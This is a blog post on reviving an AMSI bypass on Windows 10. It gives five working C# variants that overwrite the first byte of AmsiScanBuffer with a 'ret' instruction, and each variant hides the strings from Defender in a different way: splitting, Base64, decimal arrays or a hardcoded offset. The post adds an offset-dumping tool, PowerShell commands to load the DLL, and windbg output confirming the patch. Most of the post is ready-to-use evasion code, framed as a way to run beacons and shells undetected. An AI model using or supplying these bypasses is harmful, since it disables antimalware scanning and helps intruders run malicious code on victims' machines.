---
layout: post
title: "AMSI - Resurrecting the Dead"






---

## Introduction

We all know that AMSI can be a pain sometimes. We just want to get our beacon running, pop some dodgy code, abuse something that Windows doesn't like, whatever it may be. But who is right there, waiting to ruin our fun... that's right, good old AMSI.

Although a pain, it serves a purpose and does an okay-ish job at it.  That being said, we all know that the design is pretty "flawed" to say the least but Microsoft seem to want to "patch" it, but not "fix" it - maybe a full fix isn't possible without a ground-up rewrite, but I'm no architect/engineer. Whilst I know it's definitely easier to just say "fix it" than actually do it, I love when patches get rolled out because it's just something else to look into and have a play with. One thing that is apparent is Microsoft do a pretty decent job at stomping out the common bypasses and stopping skiddies (like me) from using Google and popping a shell with the first result.

Well, over the last couple of days I have been reading more into AMSI and trying to further understand what fires internally, what runs off crying to Big Bro (Defender) and what doesn't. This post isn't about the work I have been reading, or what I have been testing specifically. It's merely about resurecting an old favourite that I used a while ago on Hack the Box. If you have been on the platform, or done anything that is remotely linked (like, having a Twitter account) you will have likely seen the pro lab "Rastalabs", created by the one and only <a href="https://twitter.com/_RastaMouse">Rastamouse</a>. If you haven't go check the lab and his work out, they're very much worth your time. I personally still haven't gotten around to pwning the lab yet - but everyone I have spoke to who has (accompanied by the reviews) naturally proves it's worth every penny. I digress.

ANYWAY, if we take a look at Rasta's Github - we can see a <a href="https://github.com/rasta-mouse/AmsiScanBufferBypass">bypass</a> that was posted quite some time ago. This was actually the first time I had ever bypassed AMSI, truth be told, this is the first time I had been introduced to AMSI (until this point I had literally just done Linux boxes. If Empire couldn't pop on a Windows box, I'd quit). Thanks to Rasta, I was exposed to my first AMSI bypass and the love with messing with Windows defensive mechanisms began.

If we break the C# code down in the Git above, we pretty much get the following:
- Grab the AMSI.dll base address
- Find the <a href="https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer">"AmsiScanBuffer"</a> process address
- Overwrite the start of the function with XPN's patch to change the flow of the function in memory
- Done

Calling this in Powershell via reflection (if using the C# DLL), the AMSI process is patched and effectively 'unhooked'. Anything we want to run now goes undetected by AMSI, this will no doubt still get logged and read by some human at some point in time but at this time, this is good! 

The problem nowadays is both AMSI and Defender don't like this bypass. Defender flags the DLL as malicious when dropped onto a box, and AMSI itself kicks off when running the bypass. This is due to the fact it "sees" the string "AmsiScanBuffer" and panics. This can be seen below:

![AMSI catching us]({{ site.url }}/assets/images/amsi_bypass/1_amsi_caught.png)

After messing around a little bit with seeing what Windows was and wasn't flagging, I found a couple of easy methods of resurrecting this favourite of mine and wanted to share them with anyone else who needs a cheeky bypass now and then. No doubt these will be flagged and probably "patched" at some point in the near future, but at this moment (20th May, 2020) they work.

## The Bypasses

There are 4 methods in total that I have put together, each using pretty much the same concept and skeleton as Rasta's bypass, merged with a 1 byte patch that me and Rich used in our dynamic AMSI patch from a VB macro. I believe we got the patching idea from <a href="https://twitter.com/_xpn_">Adam Chester (XPN)'s</a> patch within Rasta's script, but found out it worked with a single 'ret' rather than the full patch. In addition, if you haven't checked the work me and Rich did, feel free to check it out <a href="https://secureyourit.co.uk/wp/2019/05/10/dynamic-microsoft-office-365-amsi-in-memory-bypass-using-vba/">here</a>. It goes into AMSI in a little more depth and links out to posts that we read during our time working on that.

So here is the C# skeleton I have used for each of my bypasses:

```c#
using System;
using System.Runtime.InteropServices;

public class Amsi
{
    static byte[] patchBytes = new byte[] { 0xC3 };

    public static void Bypass()
    {
        try
        {
            // TODO: add unique logic here
            var addr;

            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)patchBytes.Length, 0x40, out oldProtect);

            Marshal.Copy(patchBytes, 0, addr, patchBytes.Length);
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }
}

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
```

Now, at this time, we do indeed look pretty similar to the Rasta patch - however, we don't need to check whether the system is 64bit or 32bit as we use the single byte patch. So this bypass only requires the single function to operate correctly (not exactly an optimisation, but I guess it makes the deployable DLL a few bytes smaller - win? Probably not). At this moment, the code above won't do anything. Infact, it probably won't even compile... so now let's look at the different ways of using the "AmsiScanBuffer" patch without flagging our malicious DLL in Defender. Remember, Defender and AMSI do NOT like the string value so we want to "hide" it whilst on disk.

### 1) Move the strings out of the function

Yup... as the title says, moving the strings out of the function seems to work. I didn't dive it too much, but I am guessing Defender only scans various parts of DLL files, which seems weird but apparently making these strings a static class variable instead of a local variable and then using them is fine. This is something I need to look into more, but right now, I have what I need. If anyone knows more about this and can enlighten me, that would be great :)

```c#
using System;
using System.Runtime.InteropServices;

public class Amsi
{
    static byte[] patchBytes = new byte[] { 0xC3 };

    static string tLib = "amsi.dll";
    static string tProc = "AmsiScanBuffer";

    public static void Bypass()
    {
        try
        {
            var lib = Win32.LoadLibrary(tLib);
            var addr = Win32.GetProcAddress(lib, tProc);

            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)patchBytes.Length, 0x40, out oldProtect);

            Marshal.Copy(patchBytes, 0, addr, patchBytes.Length);
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }
}

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
```

### 2) Break the Strings Up </3

Another simple method of preventing the strings being flagged, is by splitting them up into smaller values. Both the DLL name and target function name can be split into smaller values (all of 2 or 3 characters in length, for example) across multiple local variables. These smaller strings are then concatenated together before being used.

```c#
using System;
using System.Runtime.InteropServices;

public class Amsi
{
    static byte[] patchBytes = new byte[] { 0xC3 };

    public static void Bypass()
    {
        try
        {
            string lol = "am";
            string lol2 = "s";
            string lol3 = "i.";
            string lol4 = "d";
            string lol5 = "ll";

            string kek = "A";
            string kek2 = "ms";
            string kek3 = "iS";
            string kek4 = "can";
            string kek5 = "B";
            string kek6 = "u";
            string kek7 = "ff";
            string kek8 = "er";

            string libFull = lol + lol2 + lol3 + lol4 + lol5;
            string procFull = kek + kek2 + kek3 + kek4 + kek5 + kek6 + kek7 + kek8;

            var lib = Win32.LoadLibrary(libFull);
            var addr = Win32.GetProcAddress(lib, procFull);

            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)patchBytes.Length, 0x40, out oldProtect);

            Marshal.Copy(patchBytes, 0, addr, patchBytes.Length);
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }
}

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
```

### 3)  Base64 the Values

We all know that Base64 is the strongest level of encryption /s. So obviously Defender can't match this unbelievably complex algorithm, and we can just hide our strings this way and decode them on use. Awesome.

```c#
using System;
using System.Runtime.InteropServices;

public class Amsi
{
    static byte[] patchBytes = new byte[] { 0xC3 };

    public static void Bypass()
    {
        try
        {
            string encL = "YW1zaS5kbGw=";
            string decL = System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(encL));

            string encP = "QW1zaVNjYW5CdWZmZXI=";
            string decP = System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(encP));

            var lib = Win32.LoadLibrary(decL);
            var addr = Win32.GetProcAddress(lib, decP);

            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)patchBytes.Length, 0x40, out oldProtect);

            Marshal.Copy(patchBytes, 0, addr, patchBytes.Length);
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }
}

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
```

### 4) From Decimal to ASCII

A little more "complex" method of hiding our string is by using the decimal representation of each ASCII character within the target string. Before placing the string within the DLL source, we can convert the value to an array of decimal values, that when decoded back to ASCII gives us our working string value.

```c#
using System;
using System.Runtime.InteropServices;

public class Amsi
{
    static byte[] patchBytes = new byte[] { 0xC3 };

    public static void Bypass()
    {
        try
        {
            string decL = Encoding.ASCII.GetString(new byte[] { 97, 109, 115, 105, 46, 100, 108, 108 });
            string decP = Encoding.ASCII.GetString(new byte[] { 65, 109, 115, 105, 83, 99, 97, 110, 66, 117, 102, 102, 101, 114 });

            var lib = Win32.LoadLibrary(decL);
            var addr = Win32.GetProcAddress(lib, decP);

            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)patchBytes.Length, 0x40, out oldProtect);

            Marshal.Copy(patchBytes, 0, addr, patchBytes.Length);
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }
}

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
```

### Bonus - Dump the Offsets Separately and Hardcode the Address

A loooong while ago, I wrote a little Go project to learn how to use the Windows API (naturally, I failed miserably, but this project worked so profit). This tool would simply load AMSI, find the addresses of the AMSI functions and print the values. Whilst working on the bypass methods above, I failed to find my Go implementation and rewrote the tool but in C#, which dumps the following:

- AMSI base address
- AMSI function addresses
- AMSI function offsets from the base
- AMSI function offsets from the "AmsiScanBuffer" address

Once built and ran, the following output can be observed:

![My AMSI offset tool]({{ site.url }}/assets/images/amsi_bypass/2_amsi_offsets_tool.png)

Apart from the "AmsiResultIsMalware" function, we are able to calculate our offsets for all the other functions. The tool is pretty simple and doesn't check the results before calculating (other than + or - offsets). However the code can be seen below and any updates will be pushed to my git, so feel free to add/modify it and do a PR.

```c#
using System;
using System.Runtime.InteropServices;

namespace AmsiOffsets
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                IntPtr lib = Win32.LoadLibrary("amsi.dll");
                long libAddr = lib.ToInt64();

                Console.WriteLine("[AMSI] Lib => 0x" + libAddr.ToString("x"));
                Console.WriteLine("");

                // we want to do AmsiScanBuffer first to help with offsets later
                IntPtr scanProc = Win32.GetProcAddress(lib, "AmsiScanBuffer");
                long scanProcAddr = scanProc.ToInt64();
                Console.WriteLine("[Process] AmsiScanBuffer => 0x" + scanProcAddr.ToString("x"));

                long diffFromBase = scanProcAddr - libAddr;
                Console.WriteLine("[Offset] Base2Proc => 0x" + diffFromBase.ToString("x"));
                Console.WriteLine("");

                // https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions
                string[] functionNames = new string[]
                {
                    "AmsiCloseSession",
                    "AmsiInitialize",
                    "AmsiOpenSession",
                    "AmsiResultIsMalware",
                    "AmsiScanBuffer",
                    "AmsiScanString",
                    "AmsiUninitialize"
                };

                for (int i = 0; i < functionNames.Length; i++)
                {
                    CalcOffset(lib, libAddr, scanProcAddr, functionNames[i]);
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
                Console.WriteLine(" [x] {0}", e.InnerException);
            }
        }

        static void CalcOffset(IntPtr lib, long baseAddr, long scanAddr, string fName)
        {
            if (fName == "AmsiScanBuffer")
                return;

            IntPtr proc = Win32.GetProcAddress(lib, fName);
            long procAddr = proc.ToInt64();

            Console.WriteLine("[Process] " + fName + " => 0x" + procAddr.ToString("x"));

            long diffFromBase = procAddr - baseAddr;
            Console.WriteLine("[Offset] Base2Proc => 0x" + diffFromBase.ToString("x"));

            long diffFromScan = 0;
            bool? isMinusOffset = null; // no reason for a nullable bool I just think they're cool

            if (scanAddr > procAddr)
            {
                diffFromScan = scanAddr - procAddr;
                isMinusOffset = true;
            }
            else if (procAddr > scanAddr)
            {
                diffFromScan = procAddr - scanAddr;
                isMinusOffset = false;
            }
            else
            {
                // must be the same value, so we can ignore this one (likely to be AmsiScanBuffer)
            }

            Console.WriteLine("[Offset] Scan2Proc => " + (isMinusOffset == true ? "-" : "") + "0x" + diffFromScan.ToString("x"));
            Console.WriteLine("");
        }
    }

    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
}
```

### 5) Using Our Offset

Using the base offset to the "AmsiScanBuffer" function alone, I was able to use the same skeleton as the other 4 bypasses but utilise this identified function's offset to write directly to the address (after grabbing the base address ofcourse). Naturally, this is not dynamic and will (probably?) change across updates, especially if the AMSI.dll is changed itself - but we can just recalculate and patch our own bypass! 

```c#
using System;
using System.Runtime.InteropServices;

public class Amsi
{
    static byte[] patchBytes = new byte[] { 0xC3 };

    public static void Bypass()
    {
        try
        {
            IntPtr lib = Win32.LoadLibrary("amsi.dll");
            int offset = 0x2540;
            IntPtr addr = lib + offset;

            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)patchBytes.Length, 0x40, out oldProtect);

            Marshal.Copy(patchBytes, 0, addr, patchBytes.Length);
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }
}

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
```

## Building and Testing

Each of the previous bypasses were compiled into DLL's and tested on a fully updated Windows 10 vm. Each DLL was placed on the Desktop (without triggering Defender) and then ran with the following Powershell commands:

```powershell
[System.Reflection.Assembly]::LoadFile("C:\\Users\\usr_gary\\Desktop\\AmsiFun.dll")
[Amsi]::Bypass()
```

By running our output, we can observe the difference between the output of AMSI before and after the patch is applied:

![AMSI patch, before and after]({{ site.url }}/assets/images/amsi_bypass/3_bypassed_result.png)

We can see what's happening within memory with windbg. We want to open powershell and load the DLL. Before running the Bypass, we attach to the process and disassemble the "AmsiScanBuffer" function:

```
0:012> u amsi!amsiScanBuffer l10
amsi!AmsiScanBuffer:
00007ff8`cc652540 4c8bdc          mov     r11,rsp
00007ff8`cc652543 49895b08        mov     qword ptr [r11+8],rbx
00007ff8`cc652547 49896b10        mov     qword ptr [r11+10h],rbp
00007ff8`cc65254b 49897318        mov     qword ptr [r11+18h],rsi
00007ff8`cc65254f 57              push    rdi
00007ff8`cc652550 4156            push    r14
00007ff8`cc652552 4157            push    r15
00007ff8`cc652554 4883ec70        sub     rsp,70h
00007ff8`cc652558 4d8bf9          mov     r15,r9
00007ff8`cc65255b 418bf8          mov     edi,r8d
00007ff8`cc65255e 488bf2          mov     rsi,rdx
00007ff8`cc652561 488bd9          mov     rbx,rcx
00007ff8`cc652564 488b0dadda0000  mov     rcx,qword ptr [amsi!WPP_GLOBAL_Control (00007ff8`cc660018)]
00007ff8`cc65256b 488d05a6da0000  lea     rax,[amsi!WPP_GLOBAL_Control (00007ff8`cc660018)]
00007ff8`cc652572 488bac24b8000000 mov     rbp,qword ptr [rsp+0B8h]
00007ff8`cc65257a 4c8bb424b0000000 mov     r14,qword ptr [rsp+0B0h]
```

As we can see, the function does a number of things, but based on our bypass - we don't really care. We just need to stop it doing it. So now let's continue the process (windbg would have paused it when attaching).

Next we run the bypass with "[Amsi]::Bypass()" and break the process again in windbg. Now the bypass has been run and the patch applied, we can see that the first byte has been turned into a ret instruction. Resulting in us breaking out of the function immediately everytime it is called:

```
0:012> u amsi!amsiScanBuffer l10
amsi!AmsiScanBuffer:
00007ff8`cc652540 c3              ret
00007ff8`cc652541 8bdc            mov     ebx,esp
00007ff8`cc652543 49895b08        mov     qword ptr [r11+8],rbx
00007ff8`cc652547 49896b10        mov     qword ptr [r11+10h],rbp
00007ff8`cc65254b 49897318        mov     qword ptr [r11+18h],rsi
00007ff8`cc65254f 57              push    rdi
00007ff8`cc652550 4156            push    r14
00007ff8`cc652552 4157            push    r15
00007ff8`cc652554 4883ec70        sub     rsp,70h
00007ff8`cc652558 4d8bf9          mov     r15,r9
00007ff8`cc65255b 418bf8          mov     edi,r8d
00007ff8`cc65255e 488bf2          mov     rsi,rdx
00007ff8`cc652561 488bd9          mov     rbx,rcx
00007ff8`cc652564 488b0dadda0000  mov     rcx,qword ptr [amsi!WPP_GLOBAL_Control (00007ff8`cc660018)]
00007ff8`cc65256b 488d05a6da0000  lea     rax,[amsi!WPP_GLOBAL_Control (00007ff8`cc660018)]
00007ff8`cc652572 488bac24b8000000 mov     rbp,qword ptr [rsp+0B8h]
```

## Future work? 

Continue messing with AMSI and finding ways to make sure my PS shells are useful. Personally, I like working with AMSI and Defender. The work might not by the smartest, or the trickiest stuff in the world, but it's fun and a lot of people use them on their systems. I might as well learn about something current, huh? Enjoy your AMSI-less times!